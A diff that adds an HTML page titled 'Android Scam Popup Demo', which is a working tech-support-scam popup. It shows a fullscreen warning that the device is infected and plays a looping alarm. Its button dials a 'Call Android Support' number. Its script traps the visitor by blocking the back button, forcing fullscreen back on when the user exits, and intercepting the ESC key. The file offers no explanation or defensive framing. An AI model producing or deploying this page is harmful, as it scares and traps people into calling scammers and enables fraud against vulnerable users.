@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Android Scam Popup Demo</title>
+<style>
+  html, body {
+    margin: 0; padding: 0; height: 100%; width: 100%;
+    overflow: hidden;
+    font-family: Arial, sans-serif;
+  }
+
+  /* Fullscreen overlay popup */
+  #popupOverlay {
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: linear-gradient(135deg, #ff3b3b 0%, #8b0000 100%);
+    color: white;
+    z-index: 9999;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+    box-sizing: border-box;
+    user-select: none;
+    cursor: pointer;
+  }
+
+  #popupOverlay img {
+    width: 100px;
+    animation: shake 0.8s infinite;
+    margin-bottom: 20px;
+  }
+
+  #popupOverlay h1 {
+    font-size: 3rem;
+    margin-bottom: 15px;
+    animation: flash 1.2s infinite;
+  }
+
+  #popupOverlay p {
+    font-size: 1.3rem;
+    text-align: center;
+    margin-bottom: 30px;
+  }
+
+  #callBtn {
+    background: black;
+    color: #ff3b3b;
+    border: 2px solid #ff3b3b;
+    padding: 15px 40px;
+    font-size: 1.5rem;
+    border-radius: 40px;
+    cursor: pointer;
+    user-select: none;
+    transition: background-color 0.3s, color 0.3s;
+  }
+
+  #callBtn:hover {
+    background: #ff3b3b;
+    color: black;
+  }
+
+  /* Flash animation */
+  @keyframes flash {
+    0%, 100% {opacity: 1;}
+    50% {opacity: 0.3;}
+  }
+
+  /* Shake animation */
+  @keyframes shake {
+    0%, 100% {transform: translateX(0);}
+    25% {transform: translateX(-10px);}
+    75% {transform: translateX(10px);}
+  }
+</style>
+</head>
+<body>
+
+<div id="popupOverlay" aria-live="assertive" aria-atomic="true" role="alert" tabindex="0">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/d/d7/Android_robot.svg" alt="Android Logo" />
+  <h1>WARNING!</h1>
+  <p>Your device is infected with a virus.<br />Call Android Support immediately!</p>
+  <button id="callBtn" aria-label="Call Android Support">Call Android Support</button>
+</div>
+
+<audio id="alertSound" loop>
+  <source src="https://actions.google.com/sounds/v1/alarms/alarm_clock.ogg" type="audio/ogg" />
+  <source src="https://actions.google.com/sounds/v1/alarms/alarm_clock.mp3" type="audio/mpeg" />
+  Your browser does not support the audio element.
+</audio>
+
+<script>
+  const popupOverlay = document.getElementById('popupOverlay');
+  const callBtn = document.getElementById('callBtn');
+  const alertSound = document.getElementById('alertSound');
+
+  // Function to request fullscreen
+  async function enterFullscreen() {
+    const elem = document.documentElement;
+    try {
+      if (elem.requestFullscreen) await elem.requestFullscreen();
+      else if (elem.webkitRequestFullscreen) await elem.webkitRequestFullscreen();
+      else if (elem.msRequestFullscreen) await elem.msRequestFullscreen();
+    } catch(e) {
+      console.warn("Fullscreen failed", e);
+    }
+  }
+
+  // Play alert sound and enter fullscreen on any click on popup overlay
+  popupOverlay.addEventListener('click', async () => {
+    await enterFullscreen();
+    if(alertSound.paused) alertSound.play().catch(() => {});
+  });
+
+  // Call button opens dialer
+  callBtn.addEventListener('click', (e) => {
+    e.stopPropagation(); // prevent triggering fullscreen again
+    window.location.href = "tel:8888888888";
+  });
+
+  // Play sound immediately (some browsers restrict autoplay but user clicked popup so allowed)
+  alertSound.play().catch(() => {});
+
+  // Prevent back navigation by pushing state
+  history.pushState(null, null, location.href);
+  window.onpopstate = function () {
+    history.go(1);
+  };
+
+  // Try to re-enter fullscreen if user exits
+  document.addEventListener('fullscreenchange', () => {
+    if (!document.fullscreenElement) {
+      enterFullscreen();
+    }
+  });
+
+  // Prevent ESC key from exiting fullscreen (not foolproof)
+  window.addEventListener('keydown', e => {
+    if (e.key === 'Escape') {
+      e.preventDefault();
+      enterFullscreen();
+    }
+  });
+</script>
+
+</body>
+</html>
